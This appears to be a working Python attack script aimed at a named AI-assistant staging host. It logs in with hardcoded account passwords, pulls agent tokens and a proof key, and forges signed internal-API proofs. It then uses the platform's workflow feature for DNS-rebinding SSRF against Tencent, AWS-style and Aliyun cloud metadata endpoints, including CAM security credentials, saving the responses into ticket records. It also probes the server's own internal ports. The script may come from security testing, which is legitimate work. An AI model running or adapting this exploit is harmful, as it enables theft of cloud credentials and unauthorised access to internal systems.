#!/usr/bin/env python3
# i28728 v3: calibrate DNS rebind + web workflow re-test + self-IP internal port probe
import os,sys,json,time,base64,hmac,hashlib,subprocess,random,string,re,socket
HOST="stage-assistant.lumiiai.cn"; SELF="43.142.238.91"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
T0=time.time()
def el(): return int(time.time()-T0)
def _b64(s): return base64.b64encode(s.encode("utf-8","replace")).decode()
def R(k,v):
    s=v if isinstance(v,str) else json.dumps(v,ensure_ascii=False,default=str)
    print("R:%s:%s"%(k,_b64(s)),flush=True)
def curl(args,timeout=45):
    try:
        r=subprocess.run(["curl","-s","-k","-m",str(timeout)]+args,capture_output=True,timeout=timeout+15)
        return r.returncode,r.stdout,r.stderr
    except Exception as e: return -1,b"",repr(e).encode()
def call(path,method="GET",body=None,hdrs=None,timeout=45,maxlen=400000):
    url="https://%s%s"%(HOST,path)
    args=["--http2","-A",UA,"-H","Accept: application/json, text/plain, */*",
          "-H","Referer: https://%s/"%HOST,"-H","Origin: https://%s"%HOST,
          "-w","\n__CODE__%{http_code}"]
    if hdrs:
        for k,v in hdrs.items(): args+=["-H","%s: %s"%(k,v)]
    if body is not None:
        args+=["-X",method,"-H","Content-Type: application/json","--data-binary",json.dumps(body)]
    elif method!="GET": args+=["-X",method]
    args+=[url]
    rc,out,err=curl(args,timeout=timeout)
    txt=out.decode("utf-8","replace"); code="";i=txt.rfind("__CODE__")
    if i>=0: code=txt[i+8:].strip()[:3];txt=txt[:i]
    return {"path":path,"code":code,"body":txt[:maxlen],"len":len(txt),"err":err.decode("utf-8","replace")[:200]}
def J(r):
    try: return json.loads(r["body"])
    except Exception: return None

def login(ident,pw):
    rc,out,err=curl(["--http2","-A",UA,"-i","-X","POST","-H","Content-Type: application/json",
                     "--data-binary",json.dumps({"identifier":ident,"password":pw}),
                     "https://%s/api/auth/login"%HOST],timeout=45)
    txt=out.decode("utf-8","replace"); code="";m=re.search(r"HTTP/[0-9.]+ (\d{3})",txt)
    if m: code=m.group(1)
    mc=re.search(r"lumii_session=([^;]+)",txt); ck=("lumii_session="+mc.group(1)) if mc else None
    body=txt.split("\r\n\r\n",1)[-1] if "\r\n\r\n" in txt else txt; uid=""
    try:
        bj=json.loads(body[body.find("{"):]) if "{" in body else {}
        uid=(bj.get("user") or {}).get("id") or bj.get("id") or ""
    except Exception: pass
    return code,ck,uid,body[:120]

cookie=None;UID=""
for ident,pw in [("lc-zone-leader@lumii.dev","Lianchuang#2026"),("e2e-accept@lumii.dev","E2eAccept!0813")]:
    code,ck,uid,body=login(ident,pw)
    R("A_try_%s"%ident.split("@")[0],{"code":code,"uid":uid})
    if code=="200" and ck: cookie=ck;UID=uid;break
if not cookie: R("FATAL_no_login",{}); sys.exit(0)

RID="";RTOKEN="";PROOF_KEY=None
cr=call("/api/runtimes","POST",{"name":"rb28728-%d"%random.randint(1000,9999)},hdrs={"Cookie":cookie})
blob=cr["body"]
mid=re.search(r"AGENT_ID='([^']+)'",blob); mtk=re.search(r"AGENT_TOKEN='([^']+)'",blob); cj=J(cr) or {}
RID=mid.group(1) if mid else (cj.get("id") or (cj.get("runtime") or {}).get("id") or "")
RTOKEN=mtk.group(1) if mtk else (cj.get("token") or cj.get("agentToken") or (cj.get("runtime") or {}).get("token") or "")
if RID and RTOKEN:
    k=call("/api/runtimes/keys/current",hdrs={"x-agent-id":RID,"x-agent-token":RTOKEN})
    if k["code"]!="200": k=call("/api/runtimes/keys/current",hdrs={"x-agent-id":RID,"Authorization":"Bearer "+RTOKEN})
    if k["code"]=="200":
        try: PROOF_KEY=(J(k) or {}).get("proof_key")
        except: pass
SK="conv_28728"
def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
def make_proof(actor):
    if not PROOF_KEY: return ""
    now=int(time.time())
    claims={"session_key":SK,"platform":"dashboard","chat_id":SK,"actor_id":actor,"iss":RID,"aud":RID,"iat":now-5,"exp":now+1500}
    p=b64u(json.dumps(claims,separators=(",",":")).encode())
    sig=b64u(hmac.new(PROOF_KEY.encode(),p.encode(),hashlib.sha256).digest())
    return "v2."+p+"."+sig
def internal(name,extra=None):
    b={"platform":"dashboard","actor_id":UID,"session_key":SK}
    if extra: b.update(extra)
    return call("/internal/"+name,"POST",b,hdrs={"Authorization":"Bearer "+RTOKEN,"x-agent-id":RID,"x-lumii-turn-proof":make_proof(UID)})
cf=internal("tickets/create-folder",{"name":"rb2","icon":"grid","description":"x"})
cj=J(cf) or {}; sheet=(cj.get("sheet") or {}).get("id"); folder=(cj.get("folder") or {}).get("id")
FKEY=None
if sheet:
    sc=internal("tickets/schema",{"sheet_id":sheet}); sj=J(sc) or {}; fs=sj.get("fields") or []
    for f in fs:
        if f.get("type") in ("text","long_text","textarea","string"): FKEY=f.get("key");break
    if not FKEY and fs: FKEY=fs[0].get("key")
R("C_ids",{"sheet":sheet,"folder":folder,"fkey":FKEY,"cf":cf["code"]})
if not folder: R("FATAL_nofolder",{"body":cf["body"][:200]}); sys.exit(0)

# ---- runner-side raw checks ----
rc,out,err=curl(["-o","/dev/null","-s","-m","8","-w","%{http_code}","-H","Host: zzcheck.1u.ms","http://1.1.1.1/"],timeout=20)
R("CAL_1111",{"code":out.decode(),"err":err.decode()[:100]})
try:
    L="make-1.1.1.1-rebind-169.254-0.23-rr-%s.1u.ms"%("".join(random.choice("abcdef0123456789") for _ in range(16)))
    a1=socket.getaddrinfo(L,80,socket.AF_INET)[0][4][0]
    a2=socket.getaddrinfo(L,80,socket.AF_INET)[0][4][0]
    R("CAL_runnerdns",{"q1":a1,"q2":a2,"label":L})
except Exception as e:
    R("CAL_runnerdns",{"err":repr(e)[:200]})

def fresh(): return "".join(random.choice(string.ascii_lowercase+string.digits) for _ in range(11))
def rebind(ip2,ip1="1.1.1.1"):
    p=ip2.split("."); a=".".join(p[:2]); b=".".join(p[2:])
    return "make-%s-rebind-%s-%s-rr-%s.1u.ms"%(ip1,a,b,fresh())
def mkdef(name,url,timeoutMs,capture=True):
    onceAt=time.strftime("%Y-%m-%dT%H:%M:%SZ",time.gmtime(time.time()+9000))
    steps=[{"id":"h1","kind":"http","method":"GET","url":url,"timeoutMs":timeoutMs}]
    if capture and FKEY:
        steps.append({"id":"c1","kind":"create","sheetId":sheet,"values":{FKEY:"{{h1.status}}##{{h1.body}}"}})
    return {"name":name[:60],"enabled":True,"trigger":{"kind":"schedule","every":"once","onceAt":onceAt},
            "steps":steps,"overlap":"skip"}
def mk_run(tag,url,timeoutMs=5000):
    cr=call("/api/tickets/folders/%s/workflows"%folder,"POST",mkdef(tag,url,timeoutMs),hdrs={"Cookie":cookie})
    wj=J(cr) or {}; wid=(wj.get("workflow") or {}).get("id") or ""
    if not wid:
        R("RUN_%s"%tag,{"create":cr["code"],"body":cr["body"][:300]}); return
    rn=call("/api/tickets/folders/%s/workflows/%s/run-now"%(folder,wid),"POST",{},hdrs={"Cookie":cookie},timeout=50)
    rj=J(rn) or {}; run=rj.get("run") or (rj if rj.get("status") else None)
    if not (isinstance(run,dict) and run): R("RUN_%s"%tag,{"create":cr["code"],"run_code":rn["code"],"raw":rn["body"][:300]}); return
    R("RUN_%s"%tag,{"create":cr["code"],"status":run.get("status"),"err":run.get("error"),
                    "errMsg":run.get("errorMessage"),"stepsLog":run.get("stepsLog")})

mk_run("baidu","https://www.baidu.com/",8000)
for tgt in [("tencent_meta","169.254.0.23",80,"/latest/meta-data/"),
            ("tencent_cam","169.254.0.23",80,"/latest/meta-data/cam/security-credentials/"),
            ("generic_meta","169.254.169.254",80,"/latest/meta-data/"),
            ("aliyun","100.100.100.200",80,"/latest/meta-data/")]:
    tag,ip2,port,path=tgt; dom=rebind(ip2); url="http://%s:%d%s"%(dom,port,path)
    R("URL_%s"%tag,{"url":url}); mk_run(tag,url,4500)
for port in [8788,5000,9200,8080,3000]:
    mk_run("self_%d"%port,"http://%s:%d/"%(SELF,port),4000)

q=internal("tickets/query",{"sheet_id":sheet})
R("Q_records",{"code":q["code"],"body":q["body"][:9000]})
allruns=call("/api/tickets/folders/%s/workflow-runs?limit=60"%folder,hdrs={"Cookie":cookie},maxlen=200000)
R("ALLRUNS",{"code":allruns["code"],"body":allruns["body"][:140000]})
R("DONE",{"t":el()})
